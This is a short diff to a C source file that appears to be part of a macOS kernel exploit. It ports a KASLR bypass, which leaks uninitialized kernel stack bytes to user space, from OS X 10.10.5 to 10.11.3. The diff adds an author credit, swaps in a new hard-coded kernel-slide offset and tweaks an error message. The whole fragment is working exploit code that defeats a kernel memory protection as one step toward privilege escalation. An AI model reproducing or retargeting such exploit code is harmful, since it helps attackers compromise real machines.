@@ -8,6 +8,11 @@
  *   copying out 8 uninitialized bytes of the kernel stack to user space.
  */
 
+/*
+ * Modified for targeting 0S X 10.11.3 build 15D21
+ * By vvun91e0n
+ */
+
 #include "kernel_slide.h"
 
 #include <net/if.h>
@@ -50,10 +55,11 @@ find_kernel_slide() {
 	close(sockfd);
 	uint64_t value = *(uint64_t *)(buffer + 8);
 	if (!is_kernel_pointer(value)) {
-		printf("error: leaked 0x%016llx\n", value);
+		printf("error: leaked 0x%016llx please try again :)\n", value);
 		return 3;
 	}
-	kernel_slide = value - 0xffffff800033487f;      /* 10.10.5 (14F27): __kernel__: _ledger_credit+95 */
+	//kernel_slide = value - 0xffffff800033487f;      /* 10.10.5 (14F27): __kernel__: _ledger_credit+95 */
+	kernel_slide = value - 0xffffff80003241e0;      /* 10.11.3 (15D21): __kernel__: _zone_find_largest+.... */
 	if (is_kernel_slide(kernel_slide)) {
 		return 0;
 	}
